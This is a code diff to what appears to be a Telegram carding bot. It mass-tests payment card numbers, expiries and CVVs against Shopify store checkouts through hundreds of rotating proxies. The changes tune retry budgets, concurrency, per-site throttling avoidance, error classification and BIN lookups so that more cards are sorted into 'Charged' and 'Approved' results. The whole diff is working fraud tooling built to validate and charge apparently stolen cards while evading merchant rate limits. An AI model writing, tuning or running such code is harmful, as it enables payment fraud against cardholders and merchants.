@@ -64,10 +64,7 @@ EXTRA_CHARGED_GROUP_IDS = [-5447284969]
 BUTTON_LOCK_SECONDS = 30
 
 # ═══ OUTER RETRY CONFIG ═══
-# FIX #8: bumped from 3 rounds to 4 and delays from [30, 90, 180] to
-# [90, 180, 300, 300]. API host cooldowns are 30s and BLACKLIST is 15s;
-# short delays meant all retries fired DURING cooldown, guaranteeing
-# universal failure. Now retries outlast the cooldowns.
+# FIX #8: 4 rounds with delays that outlast API cooldowns (30s host + 15s blacklist).
 MAX_OUTER_ROUNDS = int(os.environ.get("MAX_OUTER_ROUNDS", 4))
 OUTER_RETRY_DELAYS = [
     int(os.environ.get("RETRY_DELAY_1", 90)),
@@ -77,39 +74,32 @@ OUTER_RETRY_DELAYS = [
 ]
 
 # ═══ PER-CARD RETRY BUDGETS ═══
-MAX_PROXY_RETRIES = 5
-MAX_SITE_RETRIES  = 15
+# FIX: 8 retries is plenty — real checkouts succeed within 2-3 sites.
+MAX_PROXY_RETRIES = int(os.environ.get("MAX_PROXY_RETRIES", 8))
+MAX_SITE_RETRIES  = int(os.environ.get("MAX_SITE_RETRIES", 8))
 
 # ═══ PER-CARD CONCURRENCY ═══
-# FIX #9: was 1000. At that rate, 1000 concurrent cards × fallback to 99
-# sites = 99,000 concurrent site attempts per second → instant self-throttle
-# on every site → mass SITES_EXHAUSTED. 50 is a sustainable ceiling that
-# lets sites actually process each request fully.
-CARD_CONCURRENCY = 50
+# FIX #9: With 400 proxies the proxy bottleneck is gone; CPU is the limit.
+# 50 is the sweet spot on Railway Hobby (~2 effective vCPU under load).
+CARD_CONCURRENCY = int(os.environ.get("CARD_CONCURRENCY", 50))
 
-# FIX #3: cap fallback sites sent to the API. Passing all ~99 sites
-# amplified API fan-out by 99× per card. 5 is a reasonable hedge — API's
-# own hard-dead cache and blacklist will skip known-bad sites, so 5 random
-# picks per card is plenty of diversity without blasting the pool.
-MAX_FALLBACKS = 5
+# FIX #3: cap fallback sites so we don't amplify API fan-out.
+MAX_FALLBACKS = 3
 
-# FIX #1: session-level site cooldown. Sites that return SITE_ERROR /
-# SKIP_SITE_CODES go into a TTL window instead of permanent blacklist.
-# Must be shorter than the API's HOST_COOLDOWN_SEC (30s) + BLACKLIST_SECONDS
-# (15s) so we re-try recovered sites within one card's lifecycle.
+# FIX #1: session-level site cooldown (TTL dict, not permanent set).
 SITE_COOLDOWN_TTL = 90
 
-# FIX #2: how many inner retries before deferring SITES_EXHAUSTED to the
-# outer retry round. 1 = one quick attempt, then let outer handle it.
+# FIX #2: SITES_EXHAUSTED is transient — one inner retry, then defer.
 POOL_EXHAUSTED_MAX_INNER = 1
-POOL_EXHAUSTED_INNER_DELAY = 10.0
+POOL_EXHAUSTED_INNER_DELAY = 8.0
+
+# FIX: cap concurrent cards per site to prevent THROTTLED cascades.
+SITE_CONCURRENCY_LIMIT = int(os.environ.get("SITE_CONCURRENCY_LIMIT", 5))
 
 # ═══ API CALL TIMING ═══
-# FIX #3 (side effect): in single-site mode the API ignores `attempts`,
-# so 1 is safe and prevents any client-side cascade. HTTP retries are
-# still handled via max_retries=3 in check_shopify_card.
+# FIX: match API's REQUEST_TIMEOUT (12s) plus a small buffer.
 API_ATTEMPTS = 1
-API_TIMEOUT = 25.0
+API_TIMEOUT = 14.0
 
 # ═══ STRUCTURED CODE CLASSIFICATIONS ═══
 SKIP_SITE_CODES = {
@@ -117,14 +107,20 @@ SKIP_SITE_CODES = {
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "THROTTLED",
     "CAPTCHA_REQUIRED",
 }
-PROXY_ERROR_CODES = {"PROXY_ERROR", "TIMEOUT", "API_REPLICAS_UNREACHABLE"}
+
+# FIX #12: TIMEOUT is a SITE error, not a proxy error.
+# PROXY_ERROR = proxy dead (Proxy="Dead"); TIMEOUT = site slow (Proxy="Live").
+PROXY_ERROR_CODES = {"PROXY_ERROR", "API_REPLICAS_UNREACHABLE"}
+
 SITE_ERROR_CODES = {
     "CHECKOUT_FAILED", "CART_FAILED", "GRAPHQL_ERROR", "SITE_ERROR",
     "SESSION_EXPIRED", "NEGOTIATE_FAILED", "NO_SESSION_TOKEN",
     "NO_ATTEMPT_TOKEN", "NO_SELLER_PROPOSAL", "CHECKPOINTDENIED",
     "SUBMIT_FAILED", "TOKENIZATION_FAILED", "ORDER_CREATION_FAILED",
     "NO_PAYMENT_REQUIRED",
+    "TIMEOUT",  # site-level transient — rotate to a different site
 }
+
 POOL_EXHAUSTED_CODES = {"SITES_EXHAUSTED", "Pool Exhausted"}
 CHARGED_CODES = {"ORDER_PLACED"}
 APPROVED_CODES = {
@@ -186,6 +182,20 @@ def _cleanup_site_cooldowns(session: dict) -> None:
     session['_no_product_sites'] = {
         k: v for k, v in (session.get('_no_product_sites') or {}).items() if v > now
     }
+
+
+# ═══════════════════════════════════════════════════════════════
+# PERF: BIN lookup helpers — run off the event loop so cards don't block
+# ═══════════════════════════════════════════════════════════════
+async def _safe_bin_lookup(cc_num: str) -> dict:
+    """Run get_bin_info with a 4s timeout; tolerate both sync and async."""
+    try:
+        result = get_bin_info(cc_num)
+        if asyncio.iscoroutine(result):
+            return await asyncio.wait_for(result, timeout=4.0)
+        return result if isinstance(result, dict) else {}
+    except Exception:
+        return {}
 
 
 def _cleanup_msh_sessions():
@@ -355,9 +365,12 @@ class ProxyManager:
         'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
         'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
     ]
+    # FIX #12: removed 'timeout' and 'timed out' — those match generic site
+    # timeouts which are NOT proxy failures. 'connect timeout' is kept
+    # because that specifically means the proxy connection stalled.
     PROXY_ERROR_PATTERNS = [
         'connection error', 'connection refused', 'connection reset',
-        'timeout', 'timed out', 'connect timeout',
+        'connect timeout',
         'could not resolve host', 'dns error', 'name resolution',
         'proxy authentication', 'auth failed', '407',
         'tunnel failed', 'socks error', 'ssl error',
@@ -798,25 +811,21 @@ async def process_card_api(
     if api_proxy.startswith("http://"): api_proxy = api_proxy[7:]
     elif api_proxy.startswith("https://"): api_proxy = api_proxy[8:]
     elif api_proxy.startswith("socks5://"): api_proxy = api_proxy[9:]
+
     try:
         _http = _get_msh_http_session()
         # FIX #11: check_shopify_card has its OWN internal site-fanout logic
         # that treats CARD_DECLINED as "site failed" and synthesizes
-        # SITES_EXHAUSTED when all fallback_sites return a decline. This is
-        # the actual root cause of the massive SITES_EXHAUSTED count — the
-        # sites ARE working, the cards ARE being declined, but
-        # check_shopify_card throws away the decline and reports "exhausted".
-        #
-        # The fix: pass fallback_sites=None so check_shopify_card validates
-        # exactly ONE site and returns its actual outcome (CARD_DECLINED,
-        # INSUFFICIENT_FUNDS, 3DS_REQUIRED, SITE_ERROR, etc.).
-        # msh.py's own while-loop does the site rotation.
+        # SITES_EXHAUSTED when all fallback_sites return a decline. This was
+        # the actual root cause of mass SITES_EXHAUSTED. The fix: pass
+        # fallback_sites=None so check_shopify_card validates ONE site and
+        # returns its actual outcome. msh.py's own while-loop does rotation.
         data = await check_shopify_card(
             site=site, cc=cc_formatted, proxy=api_proxy or None,
             session=_http,
-            max_retries=1,       # no HTTP retry amplification
+            max_retries=1,
             timeout_sec=API_TIMEOUT,
-            fallback_sites=None, # critical: no internal fanout
+            fallback_sites=None,
             attempts=1,
             auto=False,
         )
@@ -917,11 +926,23 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
             country_display = f"{flag} {country}" if flag else country
 
             code = _extract_code(response)
+            # FIX #12: detect "exhausted" / error phrases directly since
+            # _extract_code returns the whole phrase when there's no
+            # separator. Previously "All proxies exhausted (...)" was
+            # shown as Declined while the breakdown counted it as Error.
+            resp_upper = (response or "").upper()
+            is_exhausted = (
+                "EXHAUSTED" in resp_upper
+                or "ALL PROXIES" in resp_upper
+                or "ALL SITES" in resp_upper
+            )
+            is_synthetic_err = code in PROXY_ERROR_CODES or code in POOL_EXHAUSTED_CODES
+
             if code in CHARGED_CODES or "CHARGED" in response or "ORDER_PLACED" in response:
                 status = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 💎"
             elif code in APPROVED_CODES or "APPROVED" in response or "INVALID_CVC" in response or "INSUFFICIENT" in response or "3DS_REQUIRED" in response:
                 status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
-            elif code in PROXY_ERROR_CODES or code in SITE_ERROR_CODES or code in POOL_EXHAUSTED_CODES:
+            elif is_exhausted or is_synthetic_err or code in SITE_ERROR_CODES:
                 status = "𝗘𝗥𝗥𝗢𝗥 ❌"
             else:
                 status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⚠️"
@@ -1265,6 +1286,9 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     no_product_hits  = 0
     # FIX #2: track how many times we've hit SITES_EXHAUSTED for this card
     pool_exhausted_hits = 0
+    # FIX #12: record WHICH codes burned the proxy budget so the final
+    # message isn't a lie. E.g. "All proxies exhausted (8 errors: PROXY_ERROR)"
+    proxy_fail_codes: list[str] = []
 
     parts = cc_formatted.split('|')
     cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
@@ -1273,11 +1297,8 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     if is_session_stopped(session_id):
         return
 
-    try:
-        bin_data = await get_bin_info(cc_num[:6])
-    except Exception as e:
-        logging.warning(f"[MSH] bin lookup failed for {cc_num[:6]}: {e}")
-        bin_data = {}
+    # PERF: kick off BIN lookup concurrently with the checkout flow.
+    _bin_task = asyncio.create_task(_safe_bin_lookup(cc_num[:6]))
 
     while True:
         if is_session_stopped(session_id):
@@ -1285,7 +1306,10 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
         if proxy_fails >= MAX_PROXY_RETRIES:
             result_status = "ERROR"
-            response_msg = f"All proxies exhausted ({proxy_fails} proxy errors)"
+            code_summary = "/".join(sorted(set(proxy_fail_codes))) or "unknown"
+            response_msg = (
+                f"All proxies exhausted ({proxy_fails} errors: {code_summary})"
+            )
             break
         if site_fails >= MAX_SITE_RETRIES:
             result_status = "ERROR"
@@ -1308,7 +1332,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             return
 
         # FIX #1: time-based availability — expired cooldowns re-enter pool
-        # periodically cleanup the dicts to avoid unbounded growth
         if session['checked'] % 100 == 0:
             _cleanup_site_cooldowns(session)
 
@@ -1338,10 +1361,30 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         site = random.choice(available)
         used_site = site
 
-        # FIX #3: cap fallback sites to MAX_FALLBACKS (was full remaining pool)
+        # FIX #3: cap fallback sites to MAX_FALLBACKS
         pool_minus = [s for s in available if s != site]
         random.shuffle(pool_minus)
         fallback_sites = pool_minus[:MAX_FALLBACKS]
+
+        # PERF: cap concurrent cards per site (5) to prevent THROTTLED cascade
+        _site_sems = session.setdefault("_site_sems", {})
+        if site not in _site_sems:
+            _site_sems[site] = asyncio.Semaphore(SITE_CONCURRENCY_LIMIT)
+        _site_sem = _site_sems[site]
+        _entered = False
+        try:
+            await asyncio.wait_for(_site_sem.acquire(), timeout=1.5)
+            _entered = True
+        except asyncio.TimeoutError:
+            site_fails += 1
+            session.setdefault('_blacklisted_sites', {})[site] = (
+                time.time() + 15
+            )
+            logging.info(
+                f"[MSH] Site {site} saturated — rotating "
+                f"({site_fails}/{MAX_SITE_RETRIES})"
+            )
+            continue
 
         try:
             success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
@@ -1355,6 +1398,9 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             proxy_fails += 1
             await asyncio.sleep(0.1)
             continue
+        finally:
+            if _entered:
+                _site_sem.release()
 
         if is_session_stopped(session_id):
             return
@@ -1374,20 +1420,17 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
         code = _extract_code(message)
 
-        # FIX #11 + #2: SITES_EXHAUSTED — even with the fallback_sites=None
-        # fix, check_shopify_card may still occasionally return this when
-        # its single primary call hits a truly broken site. Treat the
-        # current site as cooldown so next iteration picks a DIFFERENT one,
-        # then retry quickly. If we still get SITES_EXHAUSTED repeatedly,
-        # it means the pool is genuinely recovering — defer to outer round.
+        # FIX #2 + #11: SITES_EXHAUSTED is TRANSIENT, not terminal.
+        # Even with fallback_sites=None, check_shopify_card may occasionally
+        # return this when its single primary call hits a truly broken site.
+        # Mark that site in cooldown so next iteration picks a DIFFERENT one,
+        # then retry quickly. If still SITES_EXHAUSTED, defer to outer round.
         if code in POOL_EXHAUSTED_CODES:
-            # Diagnostic log so we can verify what's happening on the wire
             logging.warning(
                 f"[MSH] SITES_EXHAUSTED for {cc_formatted} on site={site} "
                 f"(available={len(available)}, pool_hit={pool_exhausted_hits}/"
                 f"{POOL_EXHAUSTED_MAX_INNER}). msg={message[:200]}"
             )
-            # Mark current site bad so next iteration uses a different one
             session.setdefault('_blacklisted_sites', {})[site] = (
                 time.time() + SITE_COOLDOWN_TTL
             )
@@ -1417,7 +1460,11 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         # Proxy error — rotate silently
         if code in PROXY_ERROR_CODES:
             proxy_fails += 1
-            logging.info(f"[MSH] Proxy error for {cc_formatted} — rotating ({proxy_fails}/{MAX_PROXY_RETRIES}): {message[:80]}")
+            proxy_fail_codes.append(code)
+            logging.info(
+                f"[MSH] Proxy error for {cc_formatted} — rotating "
+                f"({proxy_fails}/{MAX_PROXY_RETRIES}): code={code} msg={message[:80]}"
+            )
             await asyncio.sleep(0.1)
             continue
 
@@ -1504,9 +1551,17 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             response_msg = message
             break
 
-        # Unknown — treat as transient
-        proxy_fails += 1
-        logging.info(f"[MSH] Unknown response for {cc_formatted}: {message[:80]} — retrying")
+        # FIX #12: unknown responses are more likely a site/API hiccup than
+        # a broken proxy. Rotate the SITE (cheap) rather than burning proxy
+        # budget (expensive — proxies have cooldowns, sites don't).
+        site_fails += 1
+        session.setdefault('_blacklisted_sites', {})[site] = (
+            time.time() + SITE_COOLDOWN_TTL
+        )
+        logging.info(
+            f"[MSH] Unknown response for {cc_formatted} on {site}: "
+            f"{message[:80]} — rotating site ({site_fails}/{MAX_SITE_RETRIES})"
+        )
         await asyncio.sleep(0.1)
         continue
 
@@ -1521,6 +1576,12 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
     if is_session_stopped(session_id):
         return
+
+    # PERF: collect the BIN lookup result
+    try:
+        bin_data = await _bin_task
+    except Exception:
+        bin_data = {}
 
     print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
     logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
@@ -1585,7 +1646,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
     elif result_status == "SKIPPED":
         # FIX #1: count SKIPPED as errors so the outer round retries them
-        # (previously they were silently dropped from the report)
         session['errors'] += 1
         session['error_cards'].append(card_result_data)
         logging.info(f"[MSH] Skipped→counted as error for outer retry: {cc_formatted}")
@@ -2059,6 +2119,8 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         # FIX #1: time-based dicts — host -> cooldown_until timestamp
         "_blacklisted_sites": {},
         "_no_product_sites": {},
+        # PERF: per-site concurrency caps
+        "_site_sems": {},
     }
     user_custom_sites = await asyncio.to_thread(get_user_sites_db, user_id)
     active_sites = user_custom_sites if user_custom_sites else get_sites()
